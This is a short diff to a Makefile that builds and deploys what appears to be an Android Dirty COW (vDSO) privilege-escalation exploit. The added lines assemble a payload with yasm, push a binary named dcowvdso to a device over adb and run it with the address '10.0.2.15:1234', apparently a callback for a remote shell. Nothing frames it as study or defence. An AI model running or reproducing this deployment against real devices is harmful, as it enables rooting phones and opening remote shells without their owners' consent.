@@ -5,11 +5,11 @@ SDK_VERSION := $(shell adb shell getprop ro.build.version.sdk)
 all: build
 
 build:
+	echo remember to ln /data/s
+	../ndk/bin/yasm -f bin payload.s && xxd -i payload payload.h
 	/home/user/adb/android-ndk-r21d/ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)
-	../../ndk/bin/yasm -f bin payload.s
-	adb push libs/$(ARCH)/testpayload /data/local/tmp/testpayload
-	adb push payload /data/local/tmp/payload
-	adb push ./libs/$(ARCH)/ex /data/local/tmp/ex
+	adb push libs/$(ARCH)/dcowvdso /data/local/tmp/dcowvdso
+	adb shell /data/local/tmp/dcowvdso '10.0.2.15:1234'
 
 clean:
 	rm -rf libs
